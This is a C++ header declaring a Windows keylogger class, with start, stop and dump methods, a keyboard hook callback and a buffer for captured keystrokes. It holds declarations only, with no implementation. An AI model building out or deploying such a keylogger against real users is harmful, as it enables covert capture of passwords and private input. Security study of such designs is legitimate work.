#pragma once
#include <windows.h>
#include <string>
#include <atomic>
#include <mutex>

class Keylogger {
public:
    Keylogger();
    ~Keylogger();

    void Start();
    void Stop();
    std::string Dump();

private:
    static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);

    HHOOK           m_hook{ nullptr };
    std::atomic<bool> m_running{ false };
    std::mutex      m_mutex;
    std::string     m_buffer;
    HMODULE         m_hModule{ nullptr };
};